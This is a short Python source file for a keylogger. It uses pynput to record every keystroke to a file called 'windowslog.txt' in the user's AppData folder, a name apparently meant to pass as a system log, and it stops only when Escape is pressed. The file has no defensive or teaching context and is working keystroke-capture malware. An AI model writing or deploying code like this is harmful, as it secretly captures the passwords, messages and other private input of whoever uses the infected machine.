from pynput.keyboard import Key, Listener
import os

key_file = os.environ["appdata"] + "\\windowslog.txt"


def on_press(key):
    letters = str(key)
    letters = letters.replace("'", "")
    if key == Key.space:
        letters = " "
    elif key == Key.enter:
        letters = "\n"
    elif key == Key.shift_l or key == Key.shift_r:
        letters.upper()
    elif key == Key.backspace:
        letters = "<backspace>"
    elif key == Key.esc:
        letters = "<ESC>"
    with open(key_file, "a", encoding="utf-8") as file:
        file.write(letters)


def on_release(key):
    if key == Key.esc:
        return False


def key_start():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
